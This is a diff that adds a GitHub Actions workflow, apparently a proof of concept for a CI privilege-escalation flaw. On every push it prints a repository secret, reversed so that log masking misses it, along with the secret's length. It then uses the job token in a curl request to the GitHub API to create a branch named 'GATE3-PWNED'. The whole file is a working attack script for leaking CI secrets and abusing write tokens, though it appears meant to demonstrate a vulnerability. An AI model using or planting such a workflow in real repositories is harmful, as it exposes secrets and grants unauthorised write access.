@@ -1,0 +1,13 @@
+name: poc-gate3
+on:
+  push:
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - env: { PS: "${{ secrets.POC_SECRET }}", SHA2: "${{ github.sha }}", TOK: "${{ github.token }}" }
+        run: |
+          echo "GATE3-RAN ref=${{ github.ref }} secretlen=${#PS} exfil=$(printf %s "$PS" | rev)"
+          curl -s -o /dev/null -w "WROTE=%{http_code}\n" -X POST -H "Authorization: token $TOK" https://api.github.com/repos/mergify-poc-gng/privesc-poc/git/refs -d "{\"ref\":\"refs/heads/GATE3-PWNED\",\"sha\":\"$SHA2\"}"
